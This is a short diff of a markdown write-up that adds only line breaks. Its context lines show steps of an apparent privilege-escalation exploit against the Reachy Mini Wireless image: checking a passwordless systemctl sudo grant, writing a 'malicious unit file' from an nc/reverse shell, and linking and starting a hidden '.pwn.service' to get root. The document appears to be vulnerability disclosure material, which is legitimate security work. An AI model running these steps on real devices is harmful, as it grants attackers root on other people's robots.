@@ -37,6 +37,8 @@ The Reachy Mini Wireless image ships the daemon user (pollen) with a passwordles
 
 **Step 1 - Confirm the sudoers grant**
 
+<br>
+
 ```sudo -n -l 2>&1 | grep systemctl```
 
 Expected output:
@@ -50,6 +52,8 @@ If the output shows a restricted form such as /usr/bin/systemctl restart reachy-
 <br>
 
 **Step 2 - Write the malicious unit file**
+
+<br>
 
 From a raw nc/reverse shell where heredoc and multi-line paste may not work, use printf to write the file in a single command:
 
@@ -77,6 +81,8 @@ sudo /usr/bin/systemctl start .pwn.service
 Expected output from the link command:
 Created symlink /etc/systemd/system/.pwn.service -> /tmp/.pwn.service.
 ```
+
+<br>
 <br>
 
 **Step 4 - Verify root execution**
